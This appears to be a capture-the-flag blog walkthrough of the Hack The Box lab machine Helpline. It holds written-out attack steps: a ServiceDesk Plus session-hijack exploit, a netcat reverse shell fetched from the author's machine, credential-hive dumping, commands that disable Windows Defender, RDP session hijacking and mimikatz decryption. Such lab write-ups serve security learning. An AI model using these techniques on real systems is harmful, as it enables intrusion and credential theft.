---
layout: post
title: "Helpline: Hack The Box Walkthrough"
date: 2019-08-18 04:15:36 +0000
last_modified_at: 2019-08-18 04:19:37 +00000
category: Walkthrough
tags: ["Hack The Box", Helpline, retired]
comments: true
image:
  feature: helpline-htb-walkthrough.jpg
  credit: ElasticComputeFarm / Pixabay
  creditlink: https://pixabay.com/photos/telephone-technical-support-cisco-1223310/
---

This post documents the complete walkthrough of Helpline, a retired vulnerable [VM][1] created by [egre55][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

Helpline is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.132 --rate=1000                                                     

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-14 08:47:18 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 5985/tcp on 10.10.10.132
Discovered open port 49667/tcp on 10.10.10.132
Discovered open port 135/tcp on 10.10.10.132
Discovered open port 8080/tcp on 10.10.10.132
```

Quite the standard ports associated with a Windows machine. Now, let's do one better with `nmap` scanning the discovered ports to establish the services.

```
# nmap -n -v -Pn -p135,5985,8080,49667 -A --reason -oN nmap.txt 10.10.10.132
...
PORT      STATE SERVICE    REASON          VERSION
135/tcp   open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
5985/tcp  open  http       syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http-proxy syn-ack ttl 127 -
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=FBE4E36CF990855BB8E3C7B1E0B91B73; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Tue, 14 May 2019 07:52:40 GMT
|     Connection: close
|     Server: -
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <script language='JavaScript' type="text/javascript" src='/scripts/Login.js?9309'></script>
|     <script language='JavaScript' type="text/javascript" src='/scripts/jquery-1.8.3.min.js'></script>
|     <link href="/style/loginstyle.css?9309" type="text/css" rel="stylesheet"/>
|     <link href="/style/new-classes.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/new-classes-sdp.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/conflict-fix.css?9309" type="text/css" rel="stylesheet">
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=2FE2FD50B0A690E025238B855358738F; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Tue, 14 May 2019 07:52:41 GMT
|     Connection: close
|     Server: -
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <script language='JavaScript' type="text/javascript" src='/scripts/Login.js?9309'></script>
|     <script language='JavaScript' type="text/javascript" src='/scripts/jquery-1.8.3.min.js'></script>
|     <link href="/style/loginstyle.css?9309" type="text/css" rel="stylesheet"/>
|     <link href="/style/new-classes.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/new-classes-sdp.css?9309" type="text/css" rel="stylesheet">
|_    <link href="/style/conflict-fix.css?9309" type="text/css" rel="stylesheet">
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: -
|_http-title: ManageEngine ServiceDesk Plus
49667/tcp open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
```

Interesting. Basically, we only have WinRM and `http` services to explore. Let's start with the `http` service. Here's how it looks like.

<a class="image-popup">
![3bf902a7.png](/assets/images/posts/helpline-htb-walkthrough/3bf902a7.png)
</a>

### ManageEngine ServiceDesk Plus 9.3

This version of ServiceDesk Plus is susceptible to [CVE-2019-10008](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10008), which allows session hijacking and privilege escalation from guest to administrator. And I have just the perfect exploit (EDB-ID [46659](https://www.exploit-db.com/exploits/46659)) for it.

<a class="image-popup">
![22b25875.png](/assets/images/posts/helpline-htb-walkthrough/22b25875.png)
</a>

Set the cookies in my browser (with the Cookie Manager Firefox add-on) as suggested and then navigate to the site.

<a class="image-popup">
![2013a328.png](/assets/images/posts/helpline-htb-walkthrough/2013a328.png)
</a>

Bam. I'm the `administrator` yo~

## Low-Privilege Shell

Now that I'm the `administrator`, it's best to create another account with the same privileges because setting cookies in the browser can be quite a pain in the ass.

To do that, go to the Admin->Users->Technicians page (strange that an Administrator is also considered a Technician `¯\_(ツ)_/¯`).

### ManageEngine ServiceDesk Plus Custom Triggers

Surprise, surprise. ServiceDesk Plus (or SDP) has super powers—the software is able to execute remote commands with custom triggers, i.e. Execute Script, upon meeting certain criteria in newly created requests or incidents. SDP is even so kind to give you an example.

_Go to Admin->Helpdesk Customizer->Custom Triggers_

<a class="image-popup">
![9be99be9.png](/assets/images/posts/helpline-htb-walkthrough/9be99be9.png)
</a>

_Execute Script_

<a class="image-popup">
![98b39381.png](/assets/images/posts/helpline-htb-walkthrough/98b39381.png)
</a>

The plan is to create a trigger to transfer a copy of `nc.exe` to the machine, and another to execute `nc.exe` as a reverse shell back to me.

<a class="image-popup">
![d8d1ada5.png](/assets/images/posts/helpline-htb-walkthrough/d8d1ada5.png)
</a>

You can see from above that I'm using the PowerShell `Invoke-WebRequest` cmdlet to download `nc.exe` from my attacking machine and saving it to `C:\Windows\tracing\nc.exe`. I have a SimpleHTTPServer set up on my attacking machine to host `nc.exe`. For the life of me, I have no clue why `C:\Windows\tracing` is world-writable but it works toward our advantage. The next trigger is to run the reverse shell. Both triggers will be activated when the subject of the new request starts with "avengers" "endgame" respectively.

Now, let's go to the Requests page to create our "Avengers: Endgame" requests.

<a class="image-popup">
![ad7c8dee.png](/assets/images/posts/helpline-htb-walkthrough/ad7c8dee.png)
</a>

_Creating the "avengers" request_

<a class="image-popup">
![aba8a740.png](/assets/images/posts/helpline-htb-walkthrough/aba8a740.png)
</a>

Nothing fancy. Create a new request with subject "avengers" and set the priority to High. Once created, the download will begin.

<a class="image-popup">
![ef69d463.png](/assets/images/posts/helpline-htb-walkthrough/ef69d463.png)
</a>

Similarly, create another new request with subject "endgame" and set the priority to High and wait for your reverse shell.

<a class="image-popup">
![5a48342f.png](/assets/images/posts/helpline-htb-walkthrough/5a48342f.png)
</a>

Boom. And this is not the only surprise.

<a class="image-popup">
![719aba65.png](/assets/images/posts/helpline-htb-walkthrough/719aba65.png)
</a>

Unbelievable.

### Getting `user.txt` and `root.txt`

It's pretty easy to find `user.txt`. `root.txt` should be at the usual location.

<a class="image-popup">
![20353e88.png](/assets/images/posts/helpline-htb-walkthrough/20353e88.png)
</a>

Time to claim it.

<a class="image-popup">
![83d3dcfd.png](/assets/images/posts/helpline-htb-walkthrough/83d3dcfd.png)
</a>

What the hell is going on? I'm `SYSTEM` yo??!! Turns out that both files are encrypted.

<a class="image-popup">
![1846c6e0.png](/assets/images/posts/helpline-htb-walkthrough/1846c6e0.png)
</a>

<a class="image-popup">
![34642297.png](/assets/images/posts/helpline-htb-walkthrough/34642297.png)
</a>

Only specific accounts are able to decrypt the files. I need credentials...

### Saving SAM, SECURITY and SYSTEM Hives

One way to retrieve credentials is to dump them out of the holy trinity of registry hives: SAM, SECURITY AND SYSTEM, with Impacket's `secretsdump.py`.

Saving them is not the issue. You can easily do that with `reg save hklm\sam` for example. The issue is where to save them so that I can download them to my attacking machine.

Our SDP is a web application and the web server serves static resources like images, right?

<a class="image-popup">
![e0d6dd51.png](/assets/images/posts/helpline-htb-walkthrough/e0d6dd51.png)
</a>

All we have to do is to find where the file is located and we can save our hives over there.

```
E:\>dir /s /b default-logo.png
dir /s /b default-logo.png
E:\ManageEngine\ServiceDesk\applications\extracted\AdventNetServiceDesk.eear\AdventNetServiceDeskWC.ear\AdventNetServiceDesk.war\images\default-logo.png
```

Bingo. And since I'm `SYSTEM`, saving the hives shouldn't be a problem.

<a class="image-popup">
![1e59a17f.png](/assets/images/posts/helpline-htb-walkthrough/1e59a17f.png)
</a>

Once that's done, we can download the files to my attacking machine.

```
# wget http://10.10.10.132:8080/images/sam
# wget http://10.10.10.132:8080/images/security
# wget http://10.10.10.132:8080/images/system
```

It's dumping time!

<a class="image-popup">
![62da879b.png](/assets/images/posts/helpline-htb-walkthrough/62da879b.png)
</a>

### Pass-the-Hash is <s>Dead</s>

What do we do with the hashes. Well, we can always crack them.

<a class="image-popup">
![83bae8f2.png](/assets/images/posts/helpline-htb-walkthrough/83bae8f2.png)
</a>

Hmm. Only `zachary`'s password is cracked. Perhaps a more efficient way is to pass-the-hash to a tool like FreeRDP. Before we do that, we need to disable Windows Defender and turn on Remote Desktop Services with PowerShell to give ourselves more options.

#### Disable Windows Defender Real-time Protection

```
PS> Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Enable Remote Desktop Services

_Enable Remote Desktop_

```
PS> Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server'-name "fDenyTSConnections" -Value 0
```

_Allow incoming RDP on firewall_

```
PS> Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true
```

_Enable secure RDP authentication_

```
PS> Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name "UserAuthentication" -Value 1
```

### Hijacking Remote Desktop Services

During my enumeration, I noticed that `leo` is logged on to the physical console, probably through automatic logon.

<a class="image-popup">
![a17b2b83.png](/assets/images/posts/helpline-htb-walkthrough/a17b2b83.png)
</a>

And since I'm `SYSTEM`, I can make use of `tscon.exe` to hijack that session into my own. How do I do that? I can pass the `administrator`'s NTLM hash to FreeRDP instead of a password. That will create an RDP session and with `tscon.exe`, I can hand over `leo`'s session over to the newly created session.

<a class="image-popup">
![357adc29.png](/assets/images/posts/helpline-htb-walkthrough/357adc29.png)
</a>

A RDP session is created, albeit access is denied. Do not click "OK".

<a class="image-popup">
![00591a68.png](/assets/images/posts/helpline-htb-walkthrough/00591a68.png)
</a>

Turn over to the Windows shell.

<a class="image-popup">
![11fd2a0f.png](/assets/images/posts/helpline-htb-walkthrough/11fd2a0f.png)
</a>

You can see the newly created RDP session. Now issue the `tscon.exe` command like so:

```
C:\> tscon 1 /dest:rdp-tcp#2
```

The FreeRDP X window that's already open will switch to Leo's session and there's another encrypted file on Leo's desktop.

<a class="image-popup">
![43e432d0.png](/assets/images/posts/helpline-htb-walkthrough/43e432d0.png)
</a>

Damn. It's suppose to unlock! Anyways, we have `SYSTEM` privileges remember? One of the oldest tricks in the book is to replace `magnify.exe` with `cmd.exe`.

<a class="image-popup">
![865a4bd0.png](/assets/images/posts/helpline-htb-walkthrough/865a4bd0.png)
</a>

What's going on?

<a class="image-popup">
![9334e5ae.png](/assets/images/posts/helpline-htb-walkthrough/9334e5ae.png)
</a>

You can see that the creator has removed `SYSTEM`'s full control permissions. Here's an ugly hack. Take ownership of the file, grant `Everyone` full control to `magnify.exe` and then delete it.

<a class="image-popup">
![7a06ad69.png](/assets/images/posts/helpline-htb-walkthrough/7a06ad69.png)
</a>

Clicking the Magnifier pops up a beautiful `SYSTEM` shell in the RDP session.

<a class="image-popup">
![b8d0f2e9.png](/assets/images/posts/helpline-htb-walkthrough/b8d0f2e9.png)
</a>

What's so special with this shell? This shell opens Windows yo~

<a class="image-popup">
![a4af6a65.png](/assets/images/posts/helpline-htb-walkthrough/a4af6a65.png)
</a>

I know `leo` is able to login automatically without entering password. Here, I open up the Registry Editor and navigate to `HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon` to check out his password. With that, simply add `leo` to the **Remote Desktop Users** group and I can unlock the screen without changing anything.

<a class="image-popup">
![04f1e86f.png](/assets/images/posts/helpline-htb-walkthrough/04f1e86f.png)
</a>

Something's strange is going on. Even `leo` has limited permissions over `admin-pass.xml`.

<a class="image-popup">
![fe2433a4.png](/assets/images/posts/helpline-htb-walkthrough/fe2433a4.png)
</a>

That's why even `leo` can't decrypt `admin-pass.xml`.

<a class="image-popup">
![1de7b343.png](/assets/images/posts/helpline-htb-walkthrough/1de7b343.png)
</a>

Well, that's an easy fix. Although `leo` lacks the permission to decrypt the file, he's still the file owner after all. As such, we can still grant `leo` full control over the file.

<a class="image-popup">
![51b7a599.png](/assets/images/posts/helpline-htb-walkthrough/51b7a599.png)
</a>

Now, we should be able to decrypt `admin-pass.xml`.

<a class="image-popup">
![bea361b2.png](/assets/images/posts/helpline-htb-walkthrough/bea361b2.png)
</a>

Here's how it looks like.

<a class="image-popup">
![1f1aac16.png](/assets/images/posts/helpline-htb-walkthrough/1f1aac16.png)
</a>

#### Getting `root.txt`

Turns out that this is the Data Protection API blob (displayed as a hexstring) for the `administrator`'s password. We can decrypt the blob with the masterkey using `mimikatz dpapi` module. And to get to the masterkey, follow the `mimikatz` [howto](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) on decrypting EFS files. Once it's decrypted, the `administrator`'s password is revealed.

<a class="image-popup">
![eff6d88f.png](/assets/images/posts/helpline-htb-walkthrough/eff6d88f.png)
</a>

Armed with this password, we can decrypt `root.txt`. Similar to `admin-pass.xml`, we have to give ourselves full control over the file to be able to decrypt.

<a class="image-popup">
![48fa9674.png](/assets/images/posts/helpline-htb-walkthrough/48fa9674.png)
</a>

#### Getting `user.txt`

For the first time, getting `user.txt` feels harder than `root.txt` due to the lack of hints. Well, there's a extremely subtle hint with the user `zachary`.

<a class="image-popup">
![9d9a3f2e.png](/assets/images/posts/helpline-htb-walkthrough/9d9a3f2e.png)
</a>

This sure is a strange group. I think the creator is telling us to look into Windows Events.

<a class="image-popup">
![87417078.png](/assets/images/posts/helpline-htb-walkthrough/87417078.png)
</a>

The only place I could think of where events contain password strings is the Security event, particularly the Process Creation tasks. Let's filter the events.

<a class="image-popup">
![d2a03c8d.png](/assets/images/posts/helpline-htb-walkthrough/d2a03c8d.png)
</a>

Then look for the string `tolu`.

<a class="image-popup">
![d07c6ad6.png](/assets/images/posts/helpline-htb-walkthrough/d07c6ad6.png)
</a>

There you go. Armed with `tolu`'s password, we can decrypt `user.txt`.

<a class="image-popup">
![3d0fd014.png](/assets/images/posts/helpline-htb-walkthrough/3d0fd014.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/180
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/
